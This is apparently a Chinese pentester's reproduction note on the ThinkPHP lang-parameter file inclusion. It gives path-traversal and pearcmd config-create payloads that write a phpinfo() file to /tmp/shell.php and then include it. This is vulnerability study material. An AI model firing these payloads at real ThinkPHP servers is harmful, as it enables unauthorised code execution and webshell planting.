---
title: lang-rce
date: 2023-09-03T15:29:52+08:00
updated: 2023-08-29T04:06:55+08:00
categories: 
- 渗透测试
- 漏洞复现
- ThinkPHP
---

## 漏洞描述

6.0.13版本及以前，存在一处本地文件包含漏洞。当多语言特性被开启时，攻击者可以使用`lang`参数来包含任意PHP文件。

虽然只能包含本地PHP文件，但在开启了`register_argc_argv`且安装了pcel/pear的环境下，可以包含`/usr/local/lib/php/pearcmd.php`并写入任意文件。

## 漏洞利用

测试包含public/index.php来确认文件包含漏洞的存在’

```
?lang=../../../../../public/index
```

如果存在，服务器会爆500

![lang-rce-500](E:\笔记软件\笔记\渗透测试\漏洞复现\ThinkPHP\lang-rce-500.jpg)

**利用pearcmd写入shell**

```
?lang=../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=phpinfo()?>+/tmp/shell.php
```

![lang-rce-1](E:\笔记软件\笔记\渗透测试\漏洞复现\ThinkPHP\lang-rce-1.png)

**文件包含，利用pearcmd在/tmp文件夹下创建文件再进行包含**

```
?lang=../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=phpinfo()?>+/tmp/shell.php
```

![lang-rce-2](E:\笔记软件\笔记\渗透测试\漏洞复现\ThinkPHP\lang-rce-2.png)

再进行包含

```
?lang=../../../../../../../tmp/shell
```

![lang-rce-3](E:\笔记软件\笔记\渗透测试\漏洞复现\ThinkPHP\lang-rce-3.png)

### 参考链接：

https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp